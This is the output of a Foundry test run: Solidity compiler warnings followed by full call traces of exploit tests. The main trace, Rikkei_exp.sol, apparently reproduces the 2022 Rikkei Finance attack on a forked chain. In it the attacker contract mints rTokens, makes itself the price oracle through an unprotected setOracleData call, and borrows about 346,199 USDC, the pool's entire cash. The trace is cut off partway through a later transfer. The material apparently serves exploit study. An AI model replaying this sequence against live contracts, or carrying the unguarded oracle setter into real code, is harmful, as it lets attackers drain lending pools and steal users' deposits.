Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.15s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    в”њв”Ђ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 218.34ms (128.39Вµs CPU time)

Ran 1 test for src/test/2022-04/Rikkei_exp.sol:ContractTest
[PASS] testExploit() (gas: 728530)
Logs:
  Before exploit, USDC balance of attacker:: 0
  After exploit, USDC balance of attacker:: 346199780826500224370302

Traces:
  [744530] ContractTest::testExploit()
    в”њв”Ђ [9796] 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”њв”Ђ [2553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в””в”Ђ в†ђ [Return] 0
    в”њв”Ђ emit log_named_uint(key: "Before exploit, USDC balance of attacker:", val: 0)
    в”њв”Ђ [24464] 0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA::approve(0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в””в”Ђ в†ђ [Return] true
    в”њв”Ђ [76896] 0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4::enterMarkets([0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA])
    в”‚   в”њв”Ђ [71685] 0x00aa3A4cF3F7528b2465e39AF420Bb3fb1474b7B::enterMarkets([0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA]) [delegatecall]
    в”‚   в”‚   в”њв”Ђ emit MarketEntered(rToken: 0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA, account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] [0]
    в”‚   в””в”Ђ в†ђ [Return] [0]
    в”њв”Ђ [129601] 0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA::mint{value: 100000000000000}()
    в”‚   в”њв”Ђ [9984] 0x191778cDf53d9312A1deD358291B989ddf027d59::getBorrowRate(101469592805999411776 [1.014e20], 158698647603023927462 [1.586e20], 25624110884186567 [2.562e16]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000000011e5afbfd
    в”‚   в”њв”Ђ emit AccrueInterest(cashPrior: 101469592805999411776 [1.014e20], interestAccumulated: 869929693372960 [8.699e14], borrowIndex: 1001806187468723244 [1.001e18], totalBorrows: 158699517532717300422 [1.586e20])
    в”‚   в”њв”Ђ [47384] 0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4::mintAllowed(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000 [1e14])
    в”‚   в”‚   в”њв”Ђ [46704] 0x00aa3A4cF3F7528b2465e39AF420Bb3fb1474b7B::mintAllowed(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000 [1e14]) [delegatecall]
    в”‚   в”‚   в”‚   в”њв”Ђ [2344] 0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA::totalSupply() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1299554944491738931651699829809 [1.299e30]
    в”‚   в”‚   в”‚   в”њв”Ђ [2531] 0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”њв”Ђ emit DistributedSupplierRifi(rToken: 0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA, supplier: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], rifiDelta: 0, rifiSupplyIndex: 1000000013932527743503771817074172411 [1e36])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”њв”Ђ emit Mint(minter: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], mintAmount: 100000000000000 [1e14], mintTokens: 499553304430711102439309 [4.995e23])
    в”‚   в”њв”Ђ emit Transfer(from: 0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 499553304430711102439309 [4.995e23])
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [5382] 0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5::setOracleData(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [14504] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::getCash() [staticcall]
    в”‚   в”њв”Ђ [12273] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::delegateToImplementation(0x3b1d21a2) [staticcall]
    в”‚   в”‚   в”њв”Ђ [6204] 0x74D4b75C3953d7f1019F51F2262750a8C0F8C4A6::getCash() [delegatecall]
    в”‚   в”‚   в”‚   в”њв”Ђ [3296] 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d::balanceOf(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 346199780826500224370302 [3.461e23]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 346199780826500224370302 [3.461e23]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 346199780826500224370302 [3.461e23]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000000494f8718f0a6a411c67e
    в”‚   в””в”Ђ в†ђ [Return] 346199780826500224370302 [3.461e23]
    в”њв”Ђ [310687] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::borrow(346199780826500224370302 [3.461e23])
    в”‚   в”њв”Ђ [309306] 0x74D4b75C3953d7f1019F51F2262750a8C0F8C4A6::borrow(346199780826500224370302 [3.461e23]) [delegatecall]
    в”‚   в”‚   в”њв”Ђ [1296] 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d::balanceOf(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 346199780826500224370302 [3.461e23]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 346199780826500224370302 [3.461e23]
    в”‚   в”‚   в”њв”Ђ [9984] 0x3b65d22a863B922ea9Ec464b80461cEbC94A9dF8::getBorrowRate(346199780826500224370302 [3.461e23], 330831795143513352408288 [3.308e23], 204299536457263471035 [2.042e20]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000000000000000000fbfb2349
    в”‚   в”‚   в”њв”Ђ emit AccrueInterest(cashPrior: 346199780826500224370302 [3.461e23], interestAccumulated: 21381866759602892904 [2.138e19], borrowIndex: 1006088976488521898 [1.006e18], totalBorrows: 330853177010272955301192 [3.308e23])
    в”‚   в”‚   в”њв”Ђ [181535] 0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4::borrowAllowed(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 346199780826500224370302 [3.461e23])
    в”‚   в”‚   в”‚   в”њв”Ђ [180845] 0x00aa3A4cF3F7528b2465e39AF420Bb3fb1474b7B::borrowAllowed(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 346199780826500224370302 [3.461e23]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit MarketEntered(rToken: 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5, account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [22934] 0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5::getUnderlyingPrice(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5640] 0x51597f405303C4377E36123cBc172b13269EA163::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [298] 0x7008fDEd94a8Ce68D01FEB633C4D81C2be7a1B20::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [11143] 0x51597f405303C4377E36123cBc172b13269EA163::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7410] 0x7008fDEd94a8Ce68D01FEB633C4D81C2be7a1B20::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 649, 99995104 [9.999e7], 1649922650 [1.649e9], 1649922650 [1.649e9], 649
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 36893488147419103881 [3.689e19], 99995104 [9.999e7], 1649922650 [1.649e9], 1649922650 [1.649e9], 36893488147419103881 [3.689e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 999951040000000000 [9.999e17]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4774] 0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0, 499553304430711102439309 [4.995e23], 0, 200178838 [2.001e8]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [25074] 0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5::getUnderlyingPrice(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [10959] ContractTest::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5640] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [298] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [12464] ContractTest::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [11143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 315483 [3.154e5], 41624753868 [4.162e10], 1649992658 [1.649e9], 1649992658 [1.649e9], 315483 [3.154e5]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 36893488147419418715 [3.689e19], 41624753868 [4.162e10], 1649992658 [1.649e9], 1649992658 [1.649e9], 36893488147419418715 [3.689e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 36893488147419418715 [3.689e19], 416247538680000000000 [4.162e20], 1649992658 [1.649e9], 1649992658 [1.649e9], 36893488147419418715 [3.689e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4162475386800000000000000000000 [4.162e30]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [15184] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [12336] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [10451] 0x74D4b75C3953d7f1019F51F2262750a8C0F8C4A6::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d::balanceOf(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 346199780826500224370302 [3.461e23]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 346199780826500224370302 [3.461e23]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0, 0, 0, 200509741 [2.005e8]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bf3892d
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0, 0, 0, 200509741 [2.005e8]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5934] 0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5::getUnderlyingPrice(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1140] 0x51597f405303C4377E36123cBc172b13269EA163::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [298] 0x7008fDEd94a8Ce68D01FEB633C4D81C2be7a1B20::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3143] 0x51597f405303C4377E36123cBc172b13269EA163::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1410] 0x7008fDEd94a8Ce68D01FEB633C4D81C2be7a1B20::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 649, 99995104 [9.999e7], 1649922650 [1.649e9], 1649922650 [1.649e9], 649
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 36893488147419103881 [3.689e19], 99995104 [9.999e7], 1649922650 [1.649e9], 1649922650 [1.649e9], 36893488147419103881 [3.689e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 999951040000000000 [9.999e17]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [387] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::borrowIndex() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1006088976488521898 [1.006e18]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [388] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::totalBorrows() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 330853177010272955301192 [3.308e23]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”њв”Ђ [1296] 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d::balanceOf(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 346199780826500224370302 [3.461e23]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 346199780826500224370302 [3.461e23]
    в”‚   в”‚   в”њв”Ђ [26739] 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 346199780826500224370302 [3.461e23])
    в”‚   в”‚   в”‚   в”њв”Ђ [25993] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 346199780826500224370302 [3.461e23]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 346199780826500224370302 [3.461e23])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ emit Borrow(borrower: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], borrowAmount: 346199780826500224370302 [3.461e23], accountBorrows: 346199780826500224370302 [3.461e23], totalBorrows: 677052957836773179671494 [6.77e23])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в””в”Ђ в†ђ [Return] 0
    в”њв”Ђ [4661] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”њв”Ђ [2232] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::delegateToImplementation(0x70a082310000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    в”‚   в”‚   в”њв”Ђ [575] 0x74D4b75C3953d7f1019F51F2262750a8C0F8C4A6::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в””в”Ђ в†ђ [Return] 0
    в”њв”Ђ [126385] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::transfer(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 0)
    в”‚   в”њв”Ђ [124889] 0x74D4b75C3953d7f1019F51F2262750a8C0F8C4A6::transfer(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 0) [delegatecall]
    в”‚   в”‚   в”њв”Ђ [117166] 0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4::transferAllowed(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 0)
    в”‚   в”‚   в”‚   в”њв”Ђ [116480] 0x00aa3A4cF3F7528b2465e39AF420Bb3fb1474b7B::transferAllowed(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 0) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2774] 0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0, 499553304430711102439309 [4.995e23], 0, 200178838 [2.001e8]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [8074] 0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5::getUnderlyingPrice(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1959] ContractTest::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1140] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [298] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4464] ContractTest::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 315483 [3.154e5], 41624753868 [4.162e10], 1649992658 [1.649e9], 1649992658 [1.649e9], 315483 [3.154e5]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 36893488147419418715 [3.689e19], 41624753868 [4.162e10], 1649992658 [1.649e9], 1649992658 [1.649e9], 36893488147419418715 [3.689e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 36893488147419418715 [3.689e19], 416247538680000000000 [4.162e20], 1649992658 [1.649e9], 1649992658 [1.649e9], 36893488147419418715 [3.689e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4162475386800000000000000000000 [4.162e30]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [9859] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7011] 0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5126] 0x74D4b75C3953d7f1019F51F2262750a8C0F8C4A6::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d::balanceOf(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0, 0, 346199780826500224370302 [3.461e23], 200509741 [2.005e8]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000494f8718f0a6a411c67e000000000000000000000000000000000000000000000000000000000bf3892d
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0, 0, 346199780826500224370302 [3.461e23], 200509741 [2.005e8]
